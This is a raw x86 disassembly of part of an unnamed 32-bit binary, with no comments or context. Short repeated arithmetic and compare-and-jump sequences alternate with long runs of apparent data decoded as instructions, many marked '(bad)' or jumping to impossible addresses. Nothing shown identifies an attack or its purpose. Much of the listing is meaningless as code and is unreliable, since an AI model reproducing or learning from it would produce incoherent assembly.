  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403af4
  403acb:	adc    al,0x49
  403acd:	and    esp,DWORD PTR [eax]
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b48
  403ad7:	jecxz  0x403ae6
  403ad9:	ret    
  403ada:	popf   
  403adb:	add    bh,0x27
  403ade:	lods   eax,DWORD PTR ds:[esi]
  403adf:	dec    ecx
  403ae0:	cdq    
  403ae1:	mov    WORD PTR [ebp+0x525fe207],es
  403ae7:	not    DWORD PTR [ebx+0x18]
  403aea:	sbb    BYTE PTR [ebx+0x379ce643],ah
  403af0:	xchg   BYTE PTR [edi+eax*2],bl
  403af3:	jmp    0xd85abeca
  403af8:	push   eax
  403af9:	adc    DWORD PTR [edx-0xa23ab44],ebx
  403aff:	mov    ss,WORD PTR [esp+edi*4]
  403b02:	pop    ds
  403b03:	sbb    al,BYTE PTR ds:0xf13288dc
  403b09:	xchg   BYTE PTR [ebx],al
  403b0b:	leave  
  403b0c:	xchg   edi,eax
  403b0d:	(bad)
  403b10:	mov    bl,0x43
  403b12:	idiv   BYTE PTR ds:0x26c5c4b8
  403b18:	cmp    al,0xe9
  403b1a:	cmc    
  403b1b:	inc    ebp
  403b1c:	out    0x8f,eax
  403b1e:	(bad)  
  403b1f:	in     al,dx
  403b20:	jae    0x403aea
  403b22:	and    al,0xc5
  403b24:	dec    ebp
  403b25:	add    eax,0x5332bab
  403b2a:	idiv   DWORD PTR [edi+0x39]
  403b2d:	jno    0x403b8f
  403b2f:	out    dx,eax
  403b30:	mov    edi,DWORD PTR [ebp+0xcea221b]
  403b36:	mov    ?,WORD PTR [ecx-0x328e5260]
  403b3c:	xlat   BYTE PTR ds:[ebx]
  403b3d:	adc    eax,0x40d814e1
  403b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b43:	fs into 
  403b45:	jl     0x403b20
  403b47:	or     ebx,DWORD PTR [edi+ebp*8]
  403b4a:	mov    al,ds:0xa6a594e3
  403b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b50:	getsec 
  403b52:	jb     0x403b78
  403b54:	in     al,dx
  403b55:	jnp    0x403b80
  403b57:	gs dec edi
  403b59:	xor    DWORD PTR [ebx],eax
  403b5b:	or     BYTE PTR [ebx-0xf],dh
  403b5e:	xchg   ebp,eax
  403b5f:	mov    BYTE PTR [ecx],al
  403b61:	in     al,dx
  403b62:	fstp   TBYTE PTR [ecx+0x59]
  403b65:	mov    edi,0x54e8441d
  403b6a:	mov    ds,WORD PTR [eax-0x2]
  403b6d:	mov    dh,0xe4
  403b6f:	out    dx,eax
  403b70:	into   
  403b71:	cdq    
  403b72:	mov    dl,0xb3
  403b74:	outs   dx,BYTE PTR ds:[esi]
  403b75:	ins    BYTE PTR es:[edi],dx
  403b76:	je     0x403b6f
  403b78:	pop    es
  403b79:	adc    al,0xda
  403b7b:	push   edi
  403b7c:	je     0x403bc1
  403b7e:	rol    BYTE PTR ds:0x5f6821f9,1
  403b84:	push   0x3e
  403b86:	(bad)  
  403b87:	xor    ebp,ebx
  403b89:	bt     DWORD PTR [edi],esi
  403b8c:	pop    es
  403b8d:	les    esp,FWORD PTR [edi-0x4e]
  403b90:	push   ds
  403b91:	fidivr DWORD PTR [ebp-0x3d46ad21]
  403b97:	lods   eax,DWORD PTR ds:[esi]
  403b98:	dec    ebx
  403b99:	cmp    al,0x12
  403b9b:	jnp    0x403be5
  403b9d:	add    DWORD PTR [ebx],esi
  403b9f:	or     al,0xba
  403ba1:	add    edi,eax
  403ba3:	repnz fdiv st(7),st
  403ba6:	cdq    
  403ba7:	leave  
  403ba8:	xor    cl,BYTE PTR [ebp-0x8]
  403bab:	arpl   dx,di
  403bad:	pop    ebp
  403bae:	ss in  al,dx
  403bb0:	jecxz  0x403b33
  403bb2:	aam    0xbc
  403bb4:	fs sti 
  403bb6:	push   0xfffffff8
  403bb8:	push   0xf6715bf0
  403bbd:	mov    ch,0x47
  403bbf:	(bad)  
  403bc0:	fild   DWORD PTR [edx+0x78e7b54]
  403bc6:	pop    eax
  403bc7:	stc    
  403bc8:	push   edi
  403bc9:	cmp    edi,DWORD PTR [ecx-0x12]
  403bcc:	inc    edi
  403bcd:	mov    esi,0xb33a0fe6
  403bd2:	pop    edx
  403bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bd4:	iret   
  403bd5:	xor    eax,0x1be671e
  403bda:	rcr    bl,0x7c
  403bdd:	xor    al,0x85
  403bdf:	into   
  403be0:	add    ebp,DWORD PTR [ebp+0x60]
  403be3:	mov    esp,edi
  403be5:	pop    eax
  403be6:	dec    edx
  403be7:	iret   
  403be8:	pushf  
  403be9:	test   eax,0xeb5b6969
  403bee:	sti    
  403bef:	xchg   edx,eax
  403bf0:	and    ah,al
  403bf2:	push   0xffffffff
  403bf4:	push   esi
  403bf5:	cmp    al,0xd2
  403bf7:	mov    ds:0x31510f02,eax
  403bfc:	ds pop ss
  403bfe:	(bad)
  403c01:	fucomp st(5)
  403c03:	pop    es
  403c04:	xor    BYTE PTR [ebp-0x7c],dl
  403c07:	adc    al,0x5c
  403c09:	xchg   ebx,eax
  403c0a:	cmp    BYTE PTR [edx+0x62],dh
  403c0d:	mov    bh,0x16
  403c0f:	cli    
  403c10:	arpl   WORD PTR [edx+0x26e75c92],bp
  403c16:	mov    dl,0xe9
  403c18:	mov    eax,0x8ad6048a
  403c1d:	aas    
  403c1e:	sub    al,0xb5
  403c20:	mov    bh,0x8e
  403c22:	adc    BYTE PTR [edi],bh
  403c24:	clc    
  403c25:	test   al,0xa3
  403c27:	and    al,0x46
  403c29:	pop    edx
  403c2a:	test   al,0x3
  403c2c:	icebp  
  403c2d:	not    ch
  403c2f:	les    ebp,FWORD PTR [eax]
  403c31:	lock pop ss
  403c33:	jmp    0x403c59
  403c35:	sbb    DWORD PTR [edx],0x70102fd
  403c3b:	push   0x22
  403c3d:	daa    
  403c3e:	mov    ch,0x3e
  403c40:	and    ebp,esp
  403c42:	dec    eax
  403c43:	xor    cl,BYTE PTR [ebp-0x67]
  403c46:	jmp    0x403c16
  403c48:	mov    WORD PTR ds:0xccd050b3,cs
  403c4e:	xlat   BYTE PTR ds:[ebx]
  403c4f:	fwait
  403c50:	lock adc bl,BYTE PTR [ebx+0xacf9c7c]
  403c57:	enter  0xf8b6,0xc8
  403c5b:	bound  eax,QWORD PTR [eax]
  403c5d:	inc    ecx
  403c5e:	ins    BYTE PTR es:[edi],dx
  403c5f:	ror    BYTE PTR [eax],1
  403c61:	addr16 cmc 
  403c63:	xor    al,0xa3
  403c65:	cmp    dl,cl
  403c67:	aam    0x2e
  403c69:	jbe    0x403c08
  403c6b:	js     0x403c78
  403c6d:	pop    ss
  403c6e:	sub    ecx,DWORD PTR [ecx+0x6c30f3ee]
  403c74:	adc    bl,ah
  403c76:	mov    ?,WORD PTR [esi+0x332bf7ea]
  403c7c:	mov    ds:0x6ab3ece3,eax
  403c81:	add    bl,ch
  403c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c84:	dec    edx
  403c85:	cli    
  403c86:	dec    edi
  403c87:	jae    0x403c24
  403c89:	fbld   TBYTE PTR [edi]
  403c8b:	lahf   
  403c8c:	xor    esi,DWORD PTR [edi-0x32b0caeb]
  403c92:	scas   eax,DWORD PTR es:[edi]
  403c93:	jmp    0x9e7a7deb
  403c98:	pop    esi
  403c99:	sbb    al,0xf3
  403c9b:	sahf   
  403c9c:	addr16 xor esi,edx
  403c9f:	(bad)  
  403ca1:	mov    al,0x43
  403ca3:	data16 test BYTE PTR ds:0xcc1f3ae5,dl
  403caa:	jno    0x403c9a
  403cac:	dec    esi
  403cad:	lock imul eax,DWORD PTR [ebp-0x775c3d4b],0x57
  403cb5:	mov    BYTE PTR [edi+0x7d],dh
  403cb8:	mov    esp,0xe64d923e
  403cbd:	stos   DWORD PTR es:[edi],eax
  403cbe:	pop    ds
  403cbf:	inc    ebp
  403cc0:	jo     0x403cae
  403cc2:	pop    ecx
  403cc3:	fimul  DWORD PTR [edx-0x5933bd64]
  403cc9:	push   edi
  403cca:	ret    0x4ebe
  403ccd:	cmp    eax,0x8a0d874e
  403cd2:	cmp    eax,0x4ae69c99
  403cd7:	out    0x7b,eax
  403cd9:	int    0x56
  403cdb:	adc    al,0xd1
  403cdd:	fisubr DWORD PTR [edi+0x2d19eaa0]
  403ce3:	and    BYTE PTR [ebp+0x11ea3201],0xb8
  403cea:	ds cs ss pushf 
  403cee:	jge    0x403c7d
  403cf0:	mov    ebp,edx
  403cf2:	fwait
  403cf3:	aas    
  403cf4:	mov    fs,WORD PTR [edx-0x73]
  403cf7:	int3   
  403cf8:	sbb    BYTE PTR [ebx+0x3],bh
  403cfb:	dec    edi
  403cfc:	xor    DWORD PTR [ecx-0x1e],edi
  403cff:	mov    ds:0x6f1edd33,al
  403d04:	adc    BYTE PTR [edx],0x9c
  403d07:	xchg   edx,eax
  403d08:	and    dl,BYTE PTR [edi-0x7b]
  403d0b:	iret   
  403d0c:	or     dl,BYTE PTR [esi-0x72]
  403d0f:	mov    edi,0xaab19ea
  403d14:	jne    0x403ce2
  403d16:	sbb    eax,DWORD PTR [esi+0x60]
  403d19:	pop    edi
  403d1a:	ins    BYTE PTR es:[edi],dx
  403d1b:	(bad)  
  403d1c:	xor    al,0xcb
  403d1e:	aam    0x2a
  403d20:	xor    al,0x14
  403d22:	add    eax,0x6e0361cc
  403d27:	sahf   
  403d28:	call   0xe131ff83
  403d2d:	(bad)  
  403d31:	ffree  st(1)
  403d33:	pop    ds
  403d34:	jle    0x403d2e
  403d36:	pop    esp
  403d37:	enter  0x5a31,0xa0
  403d3b:	pop    ecx
  403d3c:	pop    eax
  403d3d:	sbb    DWORD PTR [ebx+0xabd7835],0x52b2f595
  403d47:	setne  BYTE PTR [edx+0x61]
  403d4b:	rol    BYTE PTR [ecx+0x16d69889],0x72
  403d52:	loope  0x403da1
  403d54:	out    dx,al
  403d55:	jns    0x403d34
  403d57:	mov    WORD PTR [ecx+0x61a57bfe],es
  403d5d:	xchg   ecx,esi
  403d5f:	scas   al,BYTE PTR es:[edi]
  403d60:	lds    eax,FWORD PTR [esi-0x5fcc4cd6]
  403d66:	push   ss
  403d67:	sbb    ah,bl
  403d69:	mov    DWORD PTR [eax+0x68],ecx
  403d6c:	or     al,ch
  403d6e:	shl    BYTE PTR ss:[esi],cl
  403d71:	xchg   edx,eax
  403d72:	sar    BYTE PTR [edi-0x5b47920],0xaf
  403d79:	jo     0x403da9
  403d7b:	mov    ds:0xe0b26fb9,al
  403d80:	add    ah,al
  403d82:	ja     0x403d3b
  403d84:	jno    0x403d8c
  403d86:	in     eax,0x25
  403d88:	pop    esi
  403d89:	adc    BYTE PTR [ecx+0x3a],al
  403d8c:	arpl   bp,dx
  403d8e:	ins    BYTE PTR es:[edi],dx
  403d8f:	add    ch,BYTE PTR [esi+0x2a]
  403d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d94:	sbb    BYTE PTR [ecx-0x73],0x21
  403d98:	jns    0x403e0c
  403d9a:	rcr    ecx,1
  403d9c:	scas   al,BYTE PTR es:[edi]
  403d9d:	or     eax,0xfe09f607
  403da2:	dec    edx
  403da3:	mov    dl,0xc3
  403da5:	in     eax,0x74
  403da7:	sub    cl,dh
  403da9:	imul   ebx,DWORD PTR [edi+0x26b11427],0x74b219cc
  403db3:	js     0x403d5c
  403db5:	jns    0x403dc4
  403db7:	dec    edi
  403db8:	ret    0x7891
  403dbb:	ins    BYTE PTR es:[edi],dx
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffe6
  403e75:	dec    edi
  403e76:	and    DWORD PTR ds:0x7e7e1f0a,esp
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e62
  403e81:	les    esi,FWORD PTR [edi]
  403e83:	jne    0x403ebf
  403e85:	jo     0x403e6e
  403e87:	jo     0x403e27
  403e89:	stos   BYTE PTR es:[edi],al
  403e8a:	jb     0x403e96
  403e8c:	mov    edi,0x393a3bdf
  403e91:	call   FWORD PTR [ecx+0x31fca3f]
  403e97:	ret    
  403e98:	pop    edi
  403e99:	sub    BYTE PTR fs:[ebx+0x66],bl
  403e9d:	push   edi
  403e9e:	arpl   WORD PTR [edi-0x6bcbc1ad],cx
  403ea4:	push   ecx
  403ea5:	imul   ebp,ebx,0xffffff95
  403ea8:	psubsb mm0,mm2
  403eab:	cs jb  0x403f24
  403eae:	and    al,0x55
  403eb0:	push   ds
  403eb1:	in     al,0xb3
  403eb3:	mov    dh,0xd9
  403eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb7:	add    eax,0x802ebbe9
  403ebc:	sub    al,0xfc
  403ebe:	jmp    0x58a7:0x98e2701d
  403ec5:	aad    0x9
  403ec7:	sahf   
  403ec8:	dec    ecx
  403ec9:	inc    ebp
  403eca:	sbb    eax,0xad2867b9
  403ecf:	aas    
  403ed0:	inc    edi
  403ed1:	and    BYTE PTR [ecx+0x66],ch
  403ed4:	mov    cs,WORD PTR [ebx+edi*4+0x3f]
  403ed8:	xor    al,0x88
  403eda:	arpl   WORD PTR [ecx+0x32b37cf5],bp
  403ee0:	nop
  403ee1:	sub    al,BYTE PTR [esi-0x80]
  403ee4:	retf   0xf328
  403ee7:	mov    eax,ds:0x4022e092
  403eec:	jne    0x403f4c
  403eee:	xlat   BYTE PTR ds:[ebx]
  403eef:	arpl   WORD PTR [edi-0x58a7df40],sp
  403ef5:	test   BYTE PTR [ebx+0x9ca8ad2],dh
  403efb:	jne    0x403ef4
  403efd:	xor    BYTE PTR [edi-0x2d5251b1],dh
  403f03:	outs   dx,BYTE PTR ds:[esi]
  403f04:	ficom  DWORD PTR [ecx+edx*8]
  403f07:	inc    ecx
  403f08:	adc    ecx,DWORD PTR [esi]
  403f0a:	aad    0xb6
  403f0c:	mov    al,ds:0xbe29169e
  403f11:	jmp    0xdee6:0xc4ba2269
  403f18:	inc    ebx
  403f19:	fcom   DWORD PTR [eax+0x6]
  403f1c:	xchg   edx,eax
  403f1d:	xor    edi,DWORD PTR [eax+esi*8]
  403f20:	dec    esi
  403f21:	mov    ds:0xb610e72c,al
  403f26:	and    BYTE PTR [eax+0x41],0xd3
  403f2a:	jp     0x403eac
  403f2c:	adc    ch,0xea
  403f2f:	out    0x28,eax
  403f31:	sub    esi,0xcd1d00bd
  403f37:	mov    cl,BYTE PTR [ecx-0x4e98a7f2]
  403f3d:	or     al,0x2
  403f3f:	in     al,0x3a
  403f41:	xor    eax,0x471cf098
  403f46:	imul   esi,esp,0x4f
  403f49:	lods   al,BYTE PTR ds:[esi]
  403f4a:	cmc    
  403f4b:	or     edi,DWORD PTR [ecx-0x5693e1ae]
  403f51:	inc    ebx
  403f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f53:	sbb    al,BYTE PTR [eax+0x78]
  403f56:	and    dl,BYTE PTR [ebp-0x417153c3]
  403f5c:	sbb    al,0xc5
  403f5e:	sti    
  403f5f:	adc    al,0x9d
  403f61:	mov    ds:0xa98ac694,eax
  403f66:	pop    eax
  403f67:	in     eax,dx
  403f68:	mov    BYTE PTR [esi+0x39],dh
  403f6b:	bnd jg 0x403f9d
  403f6e:	cs pusha 
  403f70:	push   ecx
  403f71:	inc    eax
  403f72:	std    
  403f73:	fst    DWORD PTR [ecx+0x75]
  403f76:	add    edi,DWORD PTR [esi]
  403f78:	jne    0x403fce
  403f7a:	out    0xd0,eax
  403f7c:	loope  0x403f44
  403f7e:	adc    edi,DWORD PTR [edx]
  403f80:	je     0x403fdc
  403f82:	mov    ebx,0xca15b976
  403f87:	(bad)  
  403f88:	sbb    al,0xa2
  403f8a:	mov    al,0x6
  403f8c:	pop    es
  403f8d:	sub    esp,DWORD PTR [esi+0x32]
  403f90:	and    BYTE PTR [ecx+ebx*4-0x74dc0c18],bh
  403f97:	mov    dh,0xb6
  403f99:	retf   0x741e
  403f9c:	test   eax,0x68275aae
  403fa1:	ins    DWORD PTR es:[edi],dx
  403fa2:	dec    esi
  403fa3:	lock dec edx
  403fa5:	push   ecx
  403fa6:	es cmc 
  403fa8:	add    DWORD PTR [edi+0x5d47cf98],ebp
  403fae:	loope  0x403ff9
  403fb0:	inc    ebp
  403fb1:	popa   
  403fb2:	and    BYTE PTR ss:[edx-0x55a70d76],ah
  403fb9:	sbb    al,0x4e
  403fbb:	mov    esp,0x303ef753
  403fc0:	loope  0x40403b
  403fc2:	(bad)  
  403fc3:	jmp    0x403fa8
  403fc5:	sub    DWORD PTR [ebx],eax
  403fc7:	ret    
  403fc8:	ja     0x403ffe
  403fca:	rol    BYTE PTR [ecx],1
  403fcc:	push   eax
  403fcd:	int3   
  403fce:	scas   eax,DWORD PTR es:[edi]
  403fcf:	pop    ebp
  403fd0:	pop    eax
  403fd1:	xchg   bh,al
  403fd3:	or     al,0x1c
  403fd5:	mov    edi,DWORD PTR [eax+0x5ea0601d]
  403fdb:	jo     0x403fd2
  403fdd:	sbb    dl,BYTE PTR [ebx+0x61eb573f]
  403fe3:	inc    ebx
  403fe4:	xchg   ecx,eax
  403fe5:	and    eax,DWORD PTR [esi+0x4269c0fb]
  403feb:	add    edx,DWORD PTR ds:0xec655a3c
  403ff1:	(bad)  [ebp-0x18fc29ce]
  403ff7:	(bad)  
  403ff8:	inc    BYTE PTR [esi-0x6]
  403ffb:	dec    ecx
  403ffc:	push   0xe
  403ffe:	lock xchg ecx,eax
  404000:	mov    ebx,0x4c5faa0f
  404005:	xchg   esi,eax
  404006:	xor    al,0x69
  404008:	cmp    dh,BYTE PTR [ecx]
  40400a:	dec    edx
  40400b:	test   cl,bl
  40400d:	js     0x403ff1
  40400f:	pop    ecx
  404010:	ins    BYTE PTR es:[edi],dx
  404011:	mov    edx,0x112c4af
  404016:	xchg   esp,eax
  404017:	cld    
  404018:	test   al,0xd0
  40401a:	jmp    0x2b24f674
  40401f:	aad    0x1f
  404021:	fnsave [ebp+0x7f]
  404024:	popf   
  404025:	in     eax,0xd2
  404027:	mov    ah,BYTE PTR [ebx-0x4a]
  40402a:	vpmaxub ymm3,ymm6,YMMWORD PTR [ecx+esi*1]
  40402f:	in     eax,0xf7
  404031:	outs   dx,DWORD PTR ds:[esi]
  404032:	outs   dx,BYTE PTR ds:[esi]
  404033:	lock mov ds:0x6eaa6f6d,al
  404039:	ret    0x760
  40403c:	adc    esi,DWORD PTR [edi+0x48]
  40403f:	bnd ret 
  404041:	or     bh,BYTE PTR [edx-0x2477f027]
  404047:	jg     0x404060
  404049:	pop    esi
  40404a:	push   esi
  40404b:	adc    esp,DWORD PTR [ebp-0xe]
  40404e:	retf   0xcfd6
  404051:	sub    eax,0x42d12b18
  404056:	fs repnz pusha 
  404059:	jmp    0x404035
  40405b:	sbb    al,0x72
  40405d:	retf   0x8ca6
  404060:	push   ss
  404061:	mov    cl,0x2f
  404063:	xor    DWORD PTR [esi+0x11],0x35
  404067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404069:	lock jle 0x404012
  40406c:	and    al,0x25
  40406e:	jbe    0x4040ab
  404070:	push   eax
  404071:	shl    BYTE PTR [eax+ebp*2],1
  404074:	xchg   ebp,eax
  404075:	mov    esi,0x2d960c2f
  40407a:	(bad)  
  40407b:	ret    0x5bf2
  40407e:	push   ebp
  40407f:	mov    edi,0x6b98449e
  404084:	stos   DWORD PTR es:[edi],eax
  404085:	mov    al,0x7c
  404087:	cmc    
  404088:	(bad)  
  404089:	out    dx,eax
  40408a:	fstp   TBYTE PTR [ecx]
  40408c:	xor    DWORD PTR [ecx+0x6c],ecx
  40408f:	rol    BYTE PTR [ebx-0x301ea0f2],cl
  404095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404096:	fidiv  DWORD PTR [eax-0x2d748ea5]
  40409c:	imul   esp,DWORD PTR [edi],0xba3d3830
  4040a2:	fisub  DWORD PTR [edi+0x1b608fab]
  4040a8:	fdiv   st(4),st
  4040aa:	pop    ss
  4040ab:	aas    
  4040ac:	mov    ch,0x11
  4040ae:	(bad)  
  4040af:	test   DWORD PTR [ebp+0x4065fed1],0x8dcc5dd6
  4040b9:	and    DWORD PTR [ebx-0x59],esi
  4040bc:	pusha  
  4040bd:	mov    ds:0xdd26976f,al
  4040c2:	aaa    
  4040c3:	imul   ebx,DWORD PTR [esi+0x2370dde4],0xa
  4040ca:	pop    edi
  4040cb:	call   0x5d2e772f
  4040d0:	loopne 0x4040b7
  4040d2:	xchg   ecx,eax
  4040d3:	(bad)
  4040d8:	popf   
  4040d9:	test   al,0x6a
  4040db:	cli    
  4040dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040dd:	sub    BYTE PTR [edx-0x5c],bh
  4040e0:	pop    ss
  4040e1:	push   ecx
  4040e2:	xchg   edi,eax
  4040e3:	dec    ebx
  4040e4:	test   BYTE PTR [ebx],ch
  4040e6:	mov    dl,0x79
  4040e8:	loopne 0x40415f
  4040ea:	clc    
  4040eb:	cdq    
  4040ec:	ficomp WORD PTR [ebp-0x56ceef4d]
  4040f2:	fistp  WORD PTR [edi+edi*4-0x27df04da]
  4040f9:	pop    eax
  4040fa:	shr    BYTE PTR [edx-0x29],cl
  4040fd:	xchg   ebx,eax
  4040fe:	push   ebx
  4040ff:	sbb    bl,BYTE PTR [ecx+0x3a]
  404102:	fsubr  DWORD PTR [esp+esi*2-0x15]
  404106:	pop    ds
  404107:	mov    bl,0x11
  404109:	push   es
  40410a:	into   
  40410b:	cmc    
  40410c:	or     bl,BYTE PTR [edi]
  40410e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  404110:	repz leave 
  404112:	stos   DWORD PTR es:[edi],eax
  404113:	xchg   BYTE PTR [eax+0x4e38b6f7],ch
  404119:	lea    ebp,[esi+0x1d]
  40411c:	jno    0x404197
  40411e:	mov    esp,0x84ae4481
  404123:	(bad)  
  404124:	loopne 0x404196
  404126:	imul   edi,eax,0xcc719cb8
  40412c:	aad    0x83
  40412e:	ret    0xfd23
  404131:	(bad)  
  404132:	push   edx
  404133:	enter  0xd0c8,0x26
  404137:	call   0x1bcdbed9
  40413c:	in     al,dx
  40413d:	mov    BYTE PTR [ebx+ecx*4],ch
  404140:	je     0x40415c
  404142:	xchg   edi,eax
  404143:	out    0x12,eax
  404145:	popa   
  404146:	push   eax
  404147:	push   esp
  404148:	imul   eax,eax,0x62
  40414b:	scas   eax,DWORD PTR es:[edi]
  40414c:	pop    ebx
  40414d:	sbb    eax,0x4fac09e4
  404152:	pushf  
  404153:	ds popf 
  404155:	and    al,0x53
  404157:	cmp    al,bl
  404159:	mov    cl,0xb0
  40415b:	(bad)  
  40415c:	hlt    
  40415d:	sbb    al,dl
  40415f:	jb     0x404122
  404161:	stc    
  404162:	mov    ecx,0x2bb7913e
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [eax],bl
  40418b:	mov    ds:0x1d74d203,al
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041f0
  404197:	cmc    
  404198:	retf   0x4bbc
  40419b:	lock push ecx
  40419d:	mov    dh,0x1a
  40419f:	ret    
  4041a0:	(bad)  
  4041a1:	cmc    
  4041a2:	mov    ebp,0xc74c5d14
  4041a7:	sbb    BYTE PTR [edi+0x125197a2],0x93
  4041ae:	nop
  4041af:	adc    ebx,DWORD PTR [ebx+0x1bb9da67]
  4041b5:	sbb    DWORD PTR [edi+0x7858cf36],0x80ac7695
  4041bf:	std    
  4041c0:	les    ecx,FWORD PTR [ecx-0x69]
  4041c3:	jbe    0x404219
  4041c5:	mov    bl,0xd4
  4041c7:	xor    BYTE PTR [ecx],ch
  4041c9:	fwait
  4041ca:	gs sub al,0xe0
  4041cd:	(bad)  
  4041ce:	imul   edi,DWORD PTR ds:0x8ff1105d,0x79
  4041d5:	pop    esi
  4041d6:	xlat   BYTE PTR ds:[ebx]
  4041d7:	jbe    0x404243
  4041d9:	pop    ecx
  4041da:	mov    edi,0x600ee350
  4041df:	retf   0x2e6b
  4041e2:	lahf   
  4041e3:	repz repnz push ss
  4041e6:	out    dx,al
  4041e7:	push   ebx
  4041e8:	retf   
  4041e9:	mov    bl,0x80
  4041eb:	xlat   BYTE PTR ds:[ebx]
  4041ec:	xor    eax,0xba87da1f
  4041f1:	(bad)  
  4041f2:	xchg   esp,eax
  4041f3:	scas   eax,DWORD PTR es:[edi]
  4041f4:	sahf   
  4041f5:	or     ecx,esp
  4041f7:	pop    esp
  4041f8:	mov    ds:0xfa8dc32f,eax
  4041fd:	sub    bh,ah
  4041ff:	cdq    
  404200:	(bad)  
  404201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404202:	jbe    0x404275
  404204:	ffreep st(3)
  404206:	or     ch,dh
  404208:	xchg   edi,eax
  404209:	jge    0x4041ec
  40420b:	xchg   ebx,eax
  40420c:	add    cl,BYTE PTR [ecx]
  40420e:	paddsw mm7,mm6
  404211:	sub    al,0x25
  404213:	mov    esi,0x7d752fef
  404218:	add    edx,edx
  40421a:	std    
  40421b:	adc    BYTE PTR [esp+edi*1+0x2ae2c23f],cl
  404222:	sub    BYTE PTR ds:0xfc432ec5,bh
  404228:	(bad)  
